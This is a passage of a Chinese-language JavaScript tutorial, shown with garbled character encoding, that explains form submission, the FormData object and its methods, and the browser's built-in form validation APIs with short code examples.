<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form&gt;</span><br><span class="line">  &lt;button&gt;æäº¤&lt;&#x2F;button&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢è¡¨å•çš„<code>&lt; button&gt;</code>å…ƒç´ ï¼Œç‚¹å‡»ä»¥åä¹Ÿä¼šæäº¤è¡¨å•ã€‚</p>
<p>é™¤äº†ç‚¹å‡»<code>submit</code>æ§ä»¶æäº¤è¡¨å•ï¼Œè¿˜å¯ä»¥ç”¨è¡¨å•å…ƒç´ çš„<code>submit()</code>æ–¹æ³•ï¼Œé€šè¿‡è„šæœ¬æäº¤è¡¨å•ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">formElement.submit();</span><br></pre></td></tr></table></figure>

<p>è¡¨å•å…ƒç´ çš„<code>reset()</code>æ–¹æ³•å¯ä»¥é‡ç½®æ‰€æœ‰æ§ä»¶çš„å€¼ï¼ˆé‡ç½®ä¸ºé»˜è®¤å€¼ï¼‰ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">formElement.reset()</span><br></pre></td></tr></table></figure>

<h3 id="FormData-å¯¹è±¡"><a href="#FormData-å¯¹è±¡" class="headerlink" title="FormData å¯¹è±¡"></a>FormData å¯¹è±¡</h3><h4 id="æ¦‚è¿°-6"><a href="#æ¦‚è¿°-6" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h4><p>è¡¨å•æ•°æ®ä»¥é”®å€¼å¯¹çš„å½¢å¼å‘æœåŠ¡å™¨å‘é€ï¼Œè¿™ä¸ªè¿‡ç¨‹æ˜¯æµè§ˆå™¨è‡ªåŠ¨å®Œæˆçš„ã€‚ä½†æ˜¯æœ‰æ—¶å€™ï¼Œæˆ‘ä»¬å¸Œæœ›é€šè¿‡è„šæœ¬å®Œæˆè¿™ä¸ªè¿‡ç¨‹ï¼Œæ„é€ æˆ–ç¼–è¾‘è¡¨å•çš„é”®å€¼å¯¹ï¼Œç„¶åé€šè¿‡è„šæœ¬å‘é€ç»™æœåŠ¡å™¨ã€‚æµè§ˆå™¨åŸç”Ÿæä¾›äº† FormData å¯¹è±¡æ¥å®Œæˆè¿™é¡¹å·¥ä½œã€‚</p>
<p><code>FormData()</code>é¦–å…ˆæ˜¯ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œç”¨æ¥ç”Ÿæˆè¡¨å•çš„å®ä¾‹ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var formdata &#x3D; new FormData(form);</span><br></pre></td></tr></table></figure>

<p><code>FormData()</code>æ„é€ å‡½æ•°çš„å‚æ•°æ˜¯ä¸€ä¸ª DOM çš„è¡¨å•å…ƒç´ ï¼Œæ„é€ å‡½æ•°ä¼šè‡ªåŠ¨å¤„ç†è¡¨å•çš„é”®å€¼å¯¹ã€‚è¿™ä¸ªå‚æ•°æ˜¯å¯é€‰çš„ï¼Œå¦‚æœçœç•¥è¯¥å‚æ•°ï¼Œå°±è¡¨ç¤ºä¸€ä¸ªç©ºçš„è¡¨å•ã€‚</p>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªè¡¨å•ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id&#x3D;&quot;myForm&quot; name&#x3D;&quot;myForm&quot;&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;label for&#x3D;&quot;username&quot;&gt;ç”¨æˆ·åï¼š&lt;&#x2F;label&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;username&quot; name&#x3D;&quot;username&quot;&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;label for&#x3D;&quot;useracc&quot;&gt;è´¦å·ï¼š&lt;&#x2F;label&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;useracc&quot; name&#x3D;&quot;useracc&quot;&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;label for&#x3D;&quot;userfile&quot;&gt;ä¸Šä¼ æ–‡ä»¶ï¼š&lt;&#x2F;label&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; id&#x3D;&quot;userfile&quot; name&#x3D;&quot;userfile&quot;&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit!&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬ç”¨<code>FormData()</code>å¤„ç†ä¸Šé¢è¿™ä¸ªè¡¨å•ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var myForm &#x3D; document.getElementById(&#39;myForm&#39;);</span><br><span class="line">var formData &#x3D; new FormData(myForm);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; è·å–æŸä¸ªæ§ä»¶çš„å€¼</span><br><span class="line">formData.get(&#39;username&#39;) &#x2F;&#x2F; &quot;&quot;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; è®¾ç½®æŸä¸ªæ§ä»¶çš„å€¼</span><br><span class="line">formData.set(&#39;username&#39;, &#39;å¼ ä¸‰&#39;);</span><br><span class="line"></span><br><span class="line">formData.get(&#39;username&#39;) &#x2F;&#x2F; &quot;å¼ ä¸‰&quot;</span><br></pre></td></tr></table></figure>

<h4 id="å®ä¾‹æ–¹æ³•"><a href="#å®ä¾‹æ–¹æ³•" class="headerlink" title="å®ä¾‹æ–¹æ³•"></a>å®ä¾‹æ–¹æ³•</h4><p>FormData æä¾›ä»¥ä¸‹å®ä¾‹æ–¹æ³•ã€‚</p>
<ul>
<li><code>FormData.get(key)</code>ï¼šè·å–æŒ‡å®šé”®åå¯¹åº”çš„é”®å€¼ï¼Œå‚æ•°ä¸ºé”®åã€‚å¦‚æœæœ‰å¤šä¸ªåŒåçš„é”®å€¼å¯¹ï¼Œåˆ™è¿”å›ç¬¬ä¸€ä¸ªé”®å€¼å¯¹çš„é”®å€¼ã€‚</li>
<li><code>FormData.getAll(key)</code>ï¼šè¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œè¡¨ç¤ºæŒ‡å®šé”®åå¯¹åº”çš„æ‰€æœ‰é”®å€¼ã€‚å¦‚æœæœ‰å¤šä¸ªåŒåçš„é”®å€¼å¯¹ï¼Œæ•°ç»„ä¼šåŒ…å«æ‰€æœ‰çš„é”®å€¼ã€‚</li>
<li><code>FormData.set(key, value)</code>ï¼šè®¾ç½®æŒ‡å®šé”®åçš„é”®å€¼ï¼Œå‚æ•°ä¸ºé”®åã€‚å¦‚æœé”®åä¸å­˜åœ¨ï¼Œä¼šæ·»åŠ è¿™ä¸ªé”®å€¼å¯¹ï¼Œå¦åˆ™ä¼šæ›´æ–°æŒ‡å®šé”®åçš„é”®å€¼ã€‚å¦‚æœç¬¬äºŒä¸ªå‚æ•°æ˜¯æ–‡ä»¶ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œè¡¨ç¤ºæ–‡ä»¶åã€‚</li>
<li><code>FormData.delete(key)</code>ï¼šåˆ é™¤ä¸€ä¸ªé”®å€¼å¯¹ï¼Œå‚æ•°ä¸ºé”®åã€‚</li>
<li><code>FormData.append(key, value)</code>ï¼šæ·»åŠ ä¸€ä¸ªé”®å€¼å¯¹ã€‚å¦‚æœé”®åé‡å¤ï¼Œåˆ™ä¼šç”Ÿæˆä¸¤ä¸ªç›¸åŒé”®åçš„é”®å€¼å¯¹ã€‚å¦‚æœç¬¬äºŒä¸ªå‚æ•°æ˜¯æ–‡ä»¶ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œè¡¨ç¤ºæ–‡ä»¶åã€‚</li>
<li><code>FormData.has(key)</code>ï¼šè¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæ˜¯å¦å…·æœ‰è¯¥é”®åçš„é”®å€¼å¯¹ã€‚</li>
<li><code>FormData.keys()</code>ï¼šè¿”å›ä¸€ä¸ªéå†å™¨å¯¹è±¡ï¼Œç”¨äº<code>for...of</code>å¾ªç¯éå†æ‰€æœ‰çš„é”®åã€‚</li>
<li><code>FormData.values()</code>ï¼šè¿”å›ä¸€ä¸ªéå†å™¨å¯¹è±¡ï¼Œç”¨äº<code>for...of</code>å¾ªç¯éå†æ‰€æœ‰çš„é”®å€¼ã€‚</li>
<li><code>FormData.entries()</code>ï¼šè¿”å›ä¸€ä¸ªéå†å™¨å¯¹è±¡ï¼Œç”¨äº<code>for...of</code>å¾ªç¯éå†æ‰€æœ‰çš„é”®å€¼å¯¹ã€‚å¦‚æœç›´æ¥ç”¨<code>for...of</code>å¾ªç¯éå† FormData å®ä¾‹ï¼Œé»˜è®¤å°±ä¼šè°ƒç”¨è¿™ä¸ªæ–¹æ³•ã€‚</li>
</ul>
<p>ä¸‹é¢æ˜¯<code>get()</code>ã€<code>getAll()</code>ã€<code>set()</code>ã€<code>append()</code>æ–¹æ³•çš„ä¾‹å­ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var formData &#x3D; new FormData();</span><br><span class="line"></span><br><span class="line">formData.set(&#39;username&#39;, &#39;å¼ ä¸‰&#39;);</span><br><span class="line">formData.append(&#39;username&#39;, &#39;æå››&#39;);</span><br><span class="line">formData.get(&#39;username&#39;) &#x2F;&#x2F; &quot;å¼ ä¸‰&quot;</span><br><span class="line">formData.getAll(&#39;username&#39;) &#x2F;&#x2F; [&quot;å¼ ä¸‰&quot;, &quot;æå››&quot;]</span><br><span class="line"></span><br><span class="line">formData.append(&#39;userpic[]&#39;, myFileInput.files[0], &#39;user1.jpg&#39;);</span><br><span class="line">formData.append(&#39;userpic[]&#39;, myFileInput.files[1], &#39;user2.jpg&#39;);</span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢æ˜¯éå†å™¨çš„ä¾‹å­ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">var formData &#x3D; new FormData();</span><br><span class="line">formData.append(&#39;key1&#39;, &#39;value1&#39;);</span><br><span class="line">formData.append(&#39;key2&#39;, &#39;value2&#39;);</span><br><span class="line"></span><br><span class="line">for (var key of formData.keys()) &#123;</span><br><span class="line">  console.log(key);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; &quot;key1&quot;</span><br><span class="line">&#x2F;&#x2F; &quot;key2&quot;</span><br><span class="line"></span><br><span class="line">for (var value of formData.values()) &#123;</span><br><span class="line">  console.log(value);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; &quot;value1&quot;</span><br><span class="line">&#x2F;&#x2F; &quot;value2&quot;</span><br><span class="line"></span><br><span class="line">for (var pair of formData.entries()) &#123;</span><br><span class="line">  console.log(pair[0] + &#39;: &#39; + pair[1]);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; key1: value1</span><br><span class="line">&#x2F;&#x2F; key2: value2</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; ç­‰åŒäºéå† formData.entries()</span><br><span class="line">for (var pair of formData) &#123;</span><br><span class="line">  console.log(pair[0] + &#39;: &#39; + pair[1]);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; key1: value1</span><br><span class="line">&#x2F;&#x2F; key2: value2</span><br></pre></td></tr></table></figure>

<h3 id="è¡¨å•çš„å†…ç½®éªŒè¯"><a href="#è¡¨å•çš„å†…ç½®éªŒè¯" class="headerlink" title="è¡¨å•çš„å†…ç½®éªŒè¯"></a>è¡¨å•çš„å†…ç½®éªŒè¯</h3><h4 id="è‡ªåŠ¨æ ¡éªŒ"><a href="#è‡ªåŠ¨æ ¡éªŒ" class="headerlink" title="è‡ªåŠ¨æ ¡éªŒ"></a>è‡ªåŠ¨æ ¡éªŒ</h4><p>è¡¨å•æäº¤çš„æ—¶å€™ï¼Œæµè§ˆå™¨å…è®¸å¼€å‘è€…æŒ‡å®šä¸€äº›æ¡ä»¶ï¼Œå®ƒä¼šè‡ªåŠ¨éªŒè¯å„ä¸ªè¡¨å•æ§ä»¶çš„å€¼æ˜¯å¦ç¬¦åˆæ¡ä»¶ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- å¿…å¡« --&gt;</span><br><span class="line">&lt;input required&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- å¿…é¡»ç¬¦åˆæ­£åˆ™è¡¨è¾¾å¼ --&gt;</span><br><span class="line">&lt;input pattern&#x3D;&quot;banana|cherry&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- å­—ç¬¦ä¸²é•¿åº¦å¿…é¡»ä¸º6ä¸ªå­—ç¬¦ --&gt;</span><br><span class="line">&lt;input minlength&#x3D;&quot;6&quot; maxlength&#x3D;&quot;6&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- æ•°å€¼å¿…é¡»åœ¨1åˆ°10ä¹‹é—´ --&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;number&quot; min&#x3D;&quot;1&quot; max&#x3D;&quot;10&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- å¿…é¡»å¡«å…¥ Email åœ°å€ --&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;email&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- å¿…é¡»å¡«å…¥ URL --&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;URL&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœä¸€ä¸ªæ§ä»¶é€šè¿‡éªŒè¯ï¼Œå®ƒå°±ä¼šåŒ¹é…<code>:valid</code>çš„ CSS ä¼ªç±»ï¼Œæµè§ˆå™¨ä¼šç»§ç»­è¿›è¡Œè¡¨å•æäº¤çš„æµç¨‹ã€‚å¦‚æœæ²¡æœ‰é€šè¿‡éªŒè¯ï¼Œè¯¥æ§ä»¶å°±ä¼šåŒ¹é…<code>:invalid</code>çš„ CSS ä¼ªç±»ï¼Œæµè§ˆå™¨ä¼šç»ˆæ­¢è¡¨å•æäº¤ï¼Œå¹¶æ˜¾ç¤ºä¸€ä¸ªé”™è¯¯ä¿¡æ¯ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">input:invalid &#123;</span><br><span class="line">  border-color: red;</span><br><span class="line">&#125;</span><br><span class="line">input,</span><br><span class="line">input:valid &#123;</span><br><span class="line">  border-color: #ccc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="checkValidity"><a href="#checkValidity" class="headerlink" title="checkValidity()"></a>checkValidity()</h4><p>é™¤äº†æäº¤è¡¨å•çš„æ—¶å€™ï¼Œæµè§ˆå™¨è‡ªåŠ¨æ ¡éªŒè¡¨å•ï¼Œè¿˜å¯ä»¥æ‰‹åŠ¨è§¦å‘è¡¨å•çš„æ ¡éªŒã€‚è¡¨å•å…ƒç´ å’Œè¡¨å•æ§ä»¶éƒ½æœ‰<code>checkValidity()</code>æ–¹æ³•ï¼Œç”¨äºæ‰‹åŠ¨è§¦å‘æ ¡éªŒã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; è§¦å‘æ•´ä¸ªè¡¨å•çš„æ ¡éªŒ</span><br><span class="line">form.checkValidity()</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; è§¦å‘å•ä¸ªè¡¨å•æ§ä»¶çš„æ ¡éªŒ</span><br><span class="line">formControl.checkValidity()</span><br></pre></td></tr></table></figure>

<p><code>checkValidity()</code>æ–¹æ³•è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œ<code>true</code>è¡¨ç¤ºé€šè¿‡æ ¡éªŒï¼Œ<code>false</code>è¡¨ç¤ºæ²¡æœ‰é€šè¿‡æ ¡éªŒã€‚å› æ­¤ï¼Œæäº¤è¡¨å•å¯ä»¥å°è£…ä¸ºä¸‹é¢çš„å‡½æ•°ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function submitForm(action) &#123;</span><br><span class="line">  var form &#x3D; document.getElementById(&#39;form&#39;);</span><br><span class="line">  form.action &#x3D; action;</span><br><span class="line">  if (form.checkValidity()) &#123;</span><br><span class="line">    form.submit();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="willValidate-å±æ€§"><a href="#willValidate-å±æ€§" class="headerlink" title="willValidate å±æ€§"></a>willValidate å±æ€§</h4><p>æ§ä»¶å…ƒç´ çš„<code>willValidate</code>å±æ€§æ˜¯ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºè¯¥æ§ä»¶æ˜¯å¦ä¼šåœ¨æäº¤æ—¶è¿›è¡Œæ ¡éªŒã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; HTML ä»£ç å¦‚ä¸‹</span><br><span class="line">&#x2F;&#x2F; &lt;form novalidate&gt;</span><br><span class="line">&#x2F;&#x2F;   &lt;input id&#x3D;&quot;name&quot; name&#x3D;&quot;name&quot; required &#x2F;&gt;</span><br><span class="line">&#x2F;&#x2F; &lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">var input &#x3D; document.querySelector(&#39;#name&#39;);</span><br><span class="line">input.willValidate &#x2F;&#x2F; true</span><br></pre></td></tr></table></figure>

<h4 id="validationMessage-å±æ€§"><a href="#validationMessage-å±æ€§" class="headerlink" title="validationMessage å±æ€§"></a>validationMessage å±æ€§</h4><p>æ§ä»¶å…ƒç´ çš„<code>validationMessage</code>å±æ€§è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºæ§ä»¶ä¸æ»¡è¶³æ ¡éªŒæ¡ä»¶æ—¶ï¼Œæµè§ˆå™¨æ˜¾ç¤ºçš„æç¤ºæ–‡æœ¬ã€‚ä»¥ä¸‹ä¸¤ç§æƒ…å†µï¼Œè¯¥å±æ€§è¿”å›ç©ºå­—ç¬¦ä¸²ã€‚</p>
<ul>
<li>è¯¥æ§ä»¶ä¸ä¼šåœ¨æäº¤æ—¶è‡ªåŠ¨æ ¡éªŒ</li>
<li>è¯¥æ§ä»¶æ»¡è¶³æ ¡éªŒæ¡ä»¶</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; HTML ä»£ç å¦‚ä¸‹</span><br><span class="line">&#x2F;&#x2F; &lt;form&gt;&lt;input type&#x3D;&quot;text&quot; required&gt;&lt;&#x2F;form&gt;</span><br><span class="line">document.querySelector(&#39;form input&#39;).validationMessage</span><br><span class="line">&#x2F;&#x2F; &quot;è¯·å¡«å†™æ­¤å­—æ®µã€‚&quot;</span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢æ˜¯å¦ä¸€ä¸ªä¾‹å­ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var myInput &#x3D; document.getElementById(&#39;myinput&#39;);</span><br><span class="line">if (!myInput.checkValidity()) &#123;</span><br><span class="line">  document.getElementById(&#39;prompt&#39;).innerHTML &#x3D; myInput.validationMessage;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="setCustomValidity"><a href="#setCustomValidity" class="headerlink" title="setCustomValidity()"></a>setCustomValidity()</h4><p>æ§ä»¶å…ƒç´ çš„<code>setCustomValidity()</code>æ–¹æ³•ç”¨æ¥å®šåˆ¶æ ¡éªŒå¤±è´¥æ—¶çš„æŠ¥é”™ä¿¡æ¯ã€‚å®ƒæ¥å—ä¸€ä¸ªå­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ï¼Œè¯¥å­—ç¬¦ä¸²å°±æ˜¯å®šåˆ¶çš„æŠ¥é”™ä¿¡æ¯ã€‚å¦‚æœå‚æ•°ä¸ºç©ºå­—ç¬¦ä¸²ï¼Œåˆ™ä¸Šæ¬¡è®¾ç½®çš„æŠ¥é”™ä¿¡æ¯è¢«æ¸…é™¤ã€‚</p>
<p>è¿™ä¸ªæ–¹æ³•å¯ä»¥æ›¿æ¢æµè§ˆå™¨å†…ç½®çš„è¡¨å•éªŒè¯æŠ¥é”™ä¿¡æ¯ï¼Œå‚æ•°å°±æ˜¯è¦æ˜¾ç¤ºçš„æŠ¥é”™ä¿¡æ¯ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;somefile.php&quot;&gt;</span><br><span class="line">  &lt;input</span><br><span class="line">    type&#x3D;&quot;text&quot;</span><br><span class="line">    name&#x3D;&quot;username&quot;</span><br><span class="line">    placeholder&#x3D;&quot;Username&quot;</span><br><span class="line">    pattern&#x3D;&quot;[a-z]&#123;1,15&#125;&quot;</span><br><span class="line">    id&#x3D;&quot;username&quot;</span><br><span class="line">  &gt;</span><br><span class="line">  &lt;input type&#x3D;&quot;submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢çš„è¡¨å•è¾“å…¥æ¡†ï¼Œè¦æ±‚åªèƒ½è¾“å…¥å°å†™å­—æ¯ï¼Œä¸”ä¸å¾—è¶…è¿‡15ä¸ªå­—ç¬¦ã€‚å¦‚æœè¾“å…¥ä¸ç¬¦åˆè¦æ±‚ï¼ˆæ¯”å¦‚è¾“å…¥â€œABCâ€ï¼‰ï¼Œæäº¤è¡¨å•çš„æ—¶å€™ï¼ŒChrome æµè§ˆå™¨ä¼šå¼¹å‡ºæŠ¥é”™ä¿¡æ¯â€œPlease match the requested format.â€ï¼Œç¦æ­¢è¡¨å•æäº¤ã€‚ä¸‹é¢ä½¿ç”¨<code>setCustomValidity()</code>æ–¹æ³•æ›¿æ¢æ‰æŠ¥é”™ä¿¡æ¯ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var input &#x3D; document.getElementById(&#39;username&#39;);</span><br><span class="line">input.oninvalid &#x3D; function (event) &#123;</span><br><span class="line">  event.target.setCustomValidity(</span><br><span class="line">    &#39;ç”¨æˆ·åå¿…é¡»æ˜¯å°å†™å­—æ¯ï¼Œä¸èƒ½ä¸ºç©ºï¼Œæœ€é•¿ä¸è¶…è¿‡15ä¸ªå­—ç¬¦&#39;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>setCustomValidity()</code>æ–¹æ³•æ˜¯åœ¨<code>invalid</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°é‡Œé¢è°ƒç”¨ã€‚è¯¥æ–¹æ³•ä¹Ÿå¯ä»¥ç›´æ¥è°ƒç”¨ï¼Œè¿™æ—¶å¦‚æœå‚æ•°ä¸ä¸ºç©ºå­—ç¬¦ä¸²ï¼Œæµè§ˆå™¨å°±ä¼šè®¤ä¸ºè¯¥æ§ä»¶æ²¡æœ‰é€šè¿‡æ ¡éªŒï¼Œå°±ä¼šç«‹åˆ»æ˜¾ç¤ºè¯¥æ–¹æ³•è®¾ç½®çš„æŠ¥é”™ä¿¡æ¯ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* HTML ä»£ç å¦‚ä¸‹</span><br><span class="line">&lt;form&gt;</span><br><span class="line">  &lt;p&gt;&lt;input type&#x3D;&quot;file&quot; id&#x3D;&quot;fs&quot;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">  &lt;p&gt;&lt;input type&#x3D;&quot;submit&quot;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line">document.getElementById(&#39;fs&#39;).onchange &#x3D; checkFileSize;</span><br><span class="line"></span><br><span class="line">function checkFileSize() &#123;</span><br><span class="line">  var fs &#x3D; document.getElementById(&#39;fs&#39;);</span><br><span class="line">  var files &#x3D; fs.files;</span><br><span class="line">  if (files.length &gt; 0) &#123;</span><br><span class="line">     if (files[0].size &gt; 75 * 1024) &#123;</span><br><span class="line">       fs.setCustomValidity(&#39;æ–‡ä»¶ä¸èƒ½å¤§äº 75KB&#39;);</span><br><span class="line">       return;</span><br><span class="line">     &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  fs.setCustomValidity(&#39;&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä»£ç ä¸€æ—¦å‘ç°æ–‡ä»¶å¤§äº 75KBï¼Œå°±ä¼šè®¾ç½®æ ¡éªŒå¤±è´¥ï¼ŒåŒæ—¶ç»™å‡ºè‡ªå®šä¹‰çš„æŠ¥é”™ä¿¡æ¯ã€‚ç„¶åï¼Œç‚¹å‡»æäº¤æŒ‰é’®æ—¶ï¼Œå°±ä¼šæ˜¾ç¤ºæŠ¥é”™ä¿¡æ¯ã€‚è¿™ç§æ ¡éªŒå¤±è´¥æ˜¯ä¸ä¼šè‡ªåŠ¨æ¶ˆé™¤çš„ï¼Œæ‰€ä»¥å¦‚æœæ‰€æœ‰æ–‡ä»¶éƒ½ç¬¦åˆæ¡ä»¶ï¼Œè¦å°†æŠ¥é”™ä¿¡æ¯è®¾ä¸ºç©ºå­—ç¬¦ä¸²ï¼Œæ‰‹åŠ¨æ¶ˆé™¤æ ¡éªŒå¤±è´¥çš„çŠ¶æ€ã€‚</p>
